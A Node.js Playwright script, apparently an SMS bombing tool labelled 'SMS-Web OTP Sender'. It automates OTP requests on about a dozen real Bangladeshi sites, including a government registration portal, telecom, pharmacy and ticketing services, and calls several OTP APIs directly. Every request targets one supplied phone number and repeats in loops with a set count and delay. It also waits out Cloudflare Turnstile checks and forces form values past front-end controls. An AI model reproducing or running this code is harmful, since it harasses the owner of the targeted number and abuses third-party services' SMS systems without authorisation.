const { chromium } = require("playwright");

const sites = [
  {
    name: "Arogga",
    url: "https://www.arogga.com/account",
    steps: [
      { action: "wait", ms: 2000 },
      { action: "click", selector: 'button:has-text("Login")' },
      { action: "wait", ms: 2000 },
      { action: "fill", selector: 'input[placeholder="Enter phone number"]' },
      { action: "wait", ms: 500 },
      { action: "click", selector: 'button:has-text("Send")' },
      { action: "wait", ms: 2000 },
    ],
  },
  {
    name: "IqraLive",
    url: "https://iqra-live.com/",
    steps: [
      { action: "fill", selector: "#mobile" },
      { action: "wait", ms: 500 },
      { action: "click", selector: 'button:has-text("Sign In")' },
      { action: "wait", ms: 2000 },
    ],
  },
  {
    name: "Apex4u",
    url: "https://apex4u.com/sign-in",
    steps: [
      { action: "wait", ms: 5000 },
      { action: "fill", selector: 'input.form-field' },
      { action: "wait", ms: 500 },
      { action: "click", selector: '[data-testid="proceed-button"]' },
      { action: "wait", ms: 2000 },
    ],
  },
  {
    name: "MedEasy",
    url: "https://medeasy.health/",
    steps: [
      { action: "wait", ms: 3000 },
      { action: "click", selector: 'text=Sign In' },
      { action: "wait", ms: 3000 },
      { action: "fill", selector: 'input[name="phone"]' },
      { action: "wait", ms: 500 },
      { action: "click", selector: 'button:has-text("Send OTP")' },
      { action: "wait", ms: 2000 },
    ],
  },
  {
    name: "Chorki",
    url: "https://www.chorki.com/login",
    steps: [
      { action: "wait", ms: 5000 },
      { action: "wait_turnstile" },
      { action: "fill_phone", selector: 'input.react-international-phone-input' },
      { action: "check", selector: 'input[name="userConsent"]' },
      { action: "wait", ms: 500 },
      { action: "click", selector: 'button[type="submit"]' },
      { action: "wait", ms: 3000 },
    ],
  },
  {
    name: "Robi",
    url: "https://www.robi.com.bd/en/auth/login",
    steps: [
      { action: "wait", ms: 5000 },
      { action: "robi" },
      { action: "wait", ms: 4000 },
    ],
  },
  {
    name: "MyGov",
    url: "https://idp-v2.live.mygov.bd/registration",
    waitUntil: "domcontentloaded",
    steps: [
      { action: "wait", ms: 3000 },
      { action: "fill", selector: 'input[name="citizen_name"]', value: "Test User" },
      { action: "wait", ms: 500 },
      { action: "fill", selector: 'input#mobile' },
      { action: "wait", ms: 500 },
      { action: "click", selector: 'button[type="submit"]' },
      { action: "wait", ms: 3000 },
    ],
  },
  {
    name: "Kimi",
    url: "https://www.kimi.com/login",
    waitUntil: "domcontentloaded",
    steps: [
      { action: "wait", ms: 8000 },
      { action: "click", selector: 'input[placeholder="+86"]' },
      { action: "wait", ms: 500 },
      { action: "click", selector: 'span:has-text("+880")' },
      { action: "wait", ms: 500 },
      { action: "fill", selector: 'input[placeholder="Phone number"]' },
      { action: "wait", ms: 500 },
      { action: "click", selector: 'button:has-text("Send Code")' },
      { action: "wait", ms: 3000 },
    ],
  },
  {
    name: "Ostad",
    url: "https://ostad.app/login",
    steps: [
      { action: "wait", ms: 3000 },
      { action: "click", selector: '.cursor-pointer.py-2.px-3:nth-of-type(2)' },
      { action: "wait", ms: 1000 },
      { action: "fill", selector: 'input[type="number"]' },
      { action: "wait", ms: 500 },
      { action: "click", selector: 'button[type="submit"]' },
      { action: "wait", ms: 3000 },
    ],
  },
];

async function sendBDTickets(phone) {
  const http = require('http');
  const https = require('https');

  const post = (url, data, headers = {}) => new Promise((resolve, reject) => {
    const u = new URL(url);
    const mod = u.protocol === 'https:' ? https : http;
    const body = JSON.stringify(data);
    const req = mod.request(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...headers },
    }, (res) => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => resolve({ status: res.statusCode, body: d }));
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });

  try {
    const deviceId = `${Date.now()}-${Math.random().toString(36).slice(2)}`;
    const tokenRes = await post('https://apiv1.bdtickets.com/api/v1/auth/anonymous', {
      device_id: deviceId, device_type: 'desktop',
    });
    const token = (JSON.parse(tokenRes.body).access_token || '').toString();
    if (!token) return { name: 'BDTickets', status: 'FAILED', error: 'no token' };

    const formatted = `+880${phone.slice(-10)}`;
    const otpRes = await post('https://apiv1.bdtickets.com/api/v1/auth/otp/send', {
      phone: formatted,
    }, {
      Authorization: `Bearer ${token}`,
      'x-platform': 'web',
      'x-channel': 'direct',
    });

    if (otpRes.status >= 200 && otpRes.status < 300) {
      return { name: 'BDTickets', status: 'DONE' };
    }
    return { name: 'BDTickets', status: 'FAILED', error: `HTTP ${otpRes.status}` };
  } catch (err) {
    return { name: 'BDTickets', status: 'FAILED', error: err.message.split('\n')[0] };
  }
}

async function sendMedEasy(phone) {
  const https = require('https');
  const formatted = `+880${phone.slice(-10)}`;
  return new Promise((resolve) => {
    https.get(`https://api.medeasy.health/api/send-otp/${formatted}/`, { headers: { Accept: 'application/json' } }, (res) => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          resolve({ name: 'MedEasy', status: 'DONE' });
        } else {
          resolve({ name: 'MedEasy', status: 'FAILED', error: `HTTP ${res.statusCode}` });
        }
      });
    }).on('error', (err) => resolve({ name: 'MedEasy', status: 'FAILED', error: err.message.split('\n')[0] }));
  });
}

function sendRedX(phone) {
  const https = require('https');
  return new Promise((resolve) => {
    const data = JSON.stringify({ phoneNumber: phone });
    const req = https.request('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Origin': 'https://redx.com.bd',
        'Content-Length': data.length,
      },
    }, (res) => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          resolve({ name: 'RedX', status: 'DONE' });
        } else {
          resolve({ name: 'RedX', status: 'FAILED', error: `HTTP ${res.statusCode}` });
        }
      });
    });
    req.on('error', (err) => resolve({ name: 'RedX', status: 'FAILED', error: err.message.split('\n')[0] }));
    req.write(data);
    req.end();
  });
}

const fs = require('fs');
const configPath = process.env.SMS_WEB_CONFIG || require('os').homedir() + '/.sms-web-config.json';
const localConfigPath = __dirname + '/.sms-web-config.json';

function loadDisabled() {
  let disabled = (process.env.DISABLED || '').split(',').map(s => s.trim()).filter(Boolean);
  for (const p of [configPath, localConfigPath]) {
    try {
      const cfg = JSON.parse(fs.readFileSync(p, 'utf8'));
      if (cfg.disabled) disabled = disabled.concat(cfg.disabled);
    } catch {}
  }
  return disabled;
}

function saveConfig(disabled) {
  const cfg = JSON.stringify({ disabled: [...new Set(disabled)] }, null, 2);
  for (const p of [configPath, localConfigPath]) {
    try { fs.writeFileSync(p, cfg); } catch {}
  }
}

async function runSite(browser, site, phone) {
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  try {
    await page.goto(site.url, { waitUntil: site.waitUntil || "networkidle", timeout: 30000 });

    for (const step of site.steps) {
      if (step.action === "fill") {
        await page.waitForSelector(step.selector, { timeout: 15000 });
        const val = step.value || phone;
        await page.fill(step.selector, val);
      } else if (step.action === "click") {
        await page.waitForSelector(step.selector, { timeout: 15000 });
        await page.click(step.selector);
      } else if (step.action === "wait") {
        await page.waitForTimeout(step.ms);
      } else if (step.action === "check") {
        await page.waitForSelector(step.selector, { timeout: 15000 });
        await page.check(step.selector);
      } else if (step.action === "fill_phone") {
        await page.waitForSelector(step.selector, { timeout: 15000 });
        await page.fill(step.selector, `+880${phone.slice(-10)}`);
      } else if (step.action === "wait_turnstile") {
        await page.waitForTimeout(5000);
        try {
          await page.waitForFunction(() => {
            const el = document.querySelector('input[name="cf-turnstile-response"]');
            return el && el.value && el.value.length > 0;
          }, { timeout: 20000 });
        } catch {}
      } else if (step.action === "robi") {
        await page.evaluate((phone) => {
          const accept = Array.from(document.querySelectorAll('button')).find(b => b.textContent.includes('Accept Cookies'));
          if (accept) accept.click();
          setTimeout(() => {
            const bd = document.querySelector('.MuiBackdrop-root');
            if (bd) bd.click();
          }, 500);
          setTimeout(() => {
            const btn = Array.from(document.querySelectorAll('button')).find(b => b.textContent.includes('Log In'));
            if (btn) btn.click();
          }, 1500);
          setTimeout(() => {
            const input = document.querySelector('input[aria-label="mobile-number"]');
            if (!input) return;
            const nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
            nativeSetter.call(input, phone);
            input.dispatchEvent(new Event('input', { bubbles: true }));
            const sendBtn = Array.from(document.querySelectorAll('button')).find(b => b.textContent.includes('Send OTP'));
            if (sendBtn && !sendBtn.disabled) sendBtn.click();
          }, 3500);
        }, phone);
      }
    }

    return { name: site.name, status: "DONE" };
  } catch (err) {
    return { name: site.name, status: "FAILED", error: err.message.split("\n")[0] };
  } finally {
    await ctx.close();
  }
}

async function run(phone, count, delay) {
  const disabled = loadDisabled();
  const activeSites = sites.filter(s => !disabled.includes(s.name));
  const browser = await chromium.launch({ headless: process.env.HEADLESS === 'false' ? false : true });

  for (let i = 0; i < count; i++) {
    console.log(`[${i + 1}/${count}]`);
    const results = await Promise.allSettled([
      ...activeSites.map((site) => runSite(browser, site, phone)),
      sendBDTickets(phone),
      sendMedEasy(phone),
      sendRedX(phone),
    ]);
    for (const r of results) {
      const v = r.value || {};
      console.log(`  [${v.name}] ${v.status}${v.error ? " - " + v.error : ""}`);
    }
    if (i < count - 1 && delay > 0) {
      console.log(`  Waiting ${delay}s ...`);
      await new Promise((r) => setTimeout(r, delay * 1000));
    }
  }

  await browser.close();
  console.log("Done");
}

const args = process.argv.slice(2);
const hasEnv = !!(process.env.PHONE || process.env.COUNT || process.env.DELAY);
const isMenu = args[0] === 'menu' || args[0] === 'interactive';
if ((args.length > 0 || hasEnv) && !isMenu) {
  const phone = args[0] || process.env.PHONE;
  const count = parseInt(args[1] || process.env.COUNT || "1");
  const delay = parseInt(args[2] || process.env.DELAY || "3");
  if (!phone) {
    console.error("Usage: sms-web <phone> [count] [delay]");
    console.error("   or:  PHONE=xxx COUNT=2 DELAY=3 sms-web");
    process.exit(1);
  }
  run(phone, count, delay).catch(console.error);
} else {
  if (process.stdin.isTTY) {
    const readline = require('readline');
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    const ask = (q) => new Promise(r => rl.question(q, r));

    async function showSettings() {
      while (true) {
        let disabled = loadDisabled();
        console.log("\n=== Settings: Enable/Disable Websites ===");
        for (let i = 0; i < sites.length; i++) {
          const status = disabled.includes(sites[i].name) ? "DISABLED" : "ENABLED";
          console.log(`  ${i + 1}. ${sites[i].name} [${status}]`);
        }
        console.log("  B. Back to main menu");
        const choice = (await ask("\nEnter number to toggle, B to go back: ")).trim().toUpperCase();
        if (choice === 'B') break;
        const idx = parseInt(choice) - 1;
        if (idx >= 0 && idx < sites.length) {
          let current = loadDisabled();
          const name = sites[idx].name;
          if (current.includes(name)) {
            current = current.filter(n => n !== name);
          } else {
            current.push(name);
          }
          saveConfig(current);
          const after = loadDisabled();
          console.log(`  ${name} is now ${after.includes(name) ? 'DISABLED' : 'ENABLED'}`);
        }
      }
    }

    async function showMenu() {
      console.log("\n=== SMS-Web OTP Sender ===");
      while (true) {
        console.log("\n1. Send OTP");
        console.log("2. Settings");
        console.log("0. Exit");
        const choice = (await ask("\nEnter choice: ")).trim();
        if (choice === '0') break;
        if (choice === '2') { await showSettings(); continue; }
        if (choice === '1') {
          const phone = (await ask("Phone number: ")).trim();
          if (!phone) { console.log("Phone number required"); continue; }
          const count = parseInt(await ask("Count (1): ")) || 1;
          const delay = parseInt(await ask("Delay in seconds (3): ")) || 3;
          rl.close();
          await run(phone, count, delay).catch(console.error);
          return;
        }
      }
      rl.close();
    }

    showMenu().catch(console.error);
  } else {
    const lines = [];
    process.stdin.on('data', d => lines.push(d.toString()));
    process.stdin.on('end', () => {
      const input = lines.join('').trim().split('\n').map(l => l.trim()).filter(Boolean);
      let i = 0;
      const nextInput = () => (i < input.length ? input[i++] : null);

      async function showSettings() {
        while (true) {
          let disabled = loadDisabled();
          console.log("\n=== Settings: Enable/Disable Websites ===");
          for (let i = 0; i < sites.length; i++) {
            const status = disabled.includes(sites[i].name) ? "DISABLED" : "ENABLED";
            console.log(`  ${i + 1}. ${sites[i].name} [${status}]`);
          }
          console.log("  B. Back to main menu");
          const raw = nextInput();
          if (raw === null) break;
          const choice = raw.toUpperCase();
          console.log("Enter number to toggle, B to go back: " + choice);
          if (choice === 'B') break;
          const idx = parseInt(choice) - 1;
          if (idx >= 0 && idx < sites.length) {
            let current = loadDisabled();
            const name = sites[idx].name;
            if (current.includes(name)) {
              current = current.filter(n => n !== name);
            } else {
              current.push(name);
            }
            saveConfig(current);
            const after = loadDisabled();
            console.log(`  ${name} is now ${after.includes(name) ? 'DISABLED' : 'ENABLED'}`);
          }
        }
      }

      async function showMenu() {
        console.log("\n=== SMS-Web OTP Sender ===");
        while (true) {
          console.log("\n1. Send OTP");
          console.log("2. Settings");
          console.log("0. Exit");
          const choice = nextInput();
          if (choice === null) break;
          console.log("Enter choice: " + choice);
          if (choice === '0') break;
          if (choice === '2') { await showSettings(); continue; }
          if (choice === '1') {
            const phone = nextInput();
            if (phone === null) { console.log("Phone number required"); break; }
            console.log("Phone number: " + phone);
            const c = nextInput();
            const d = nextInput();
            const count = parseInt(c) || 1;
            const delay = parseInt(d) || 3;
            run(phone, count, delay).catch(console.error);
            return;
          }
        }
      }

      showMenu().catch(console.error);
    });
  }
}
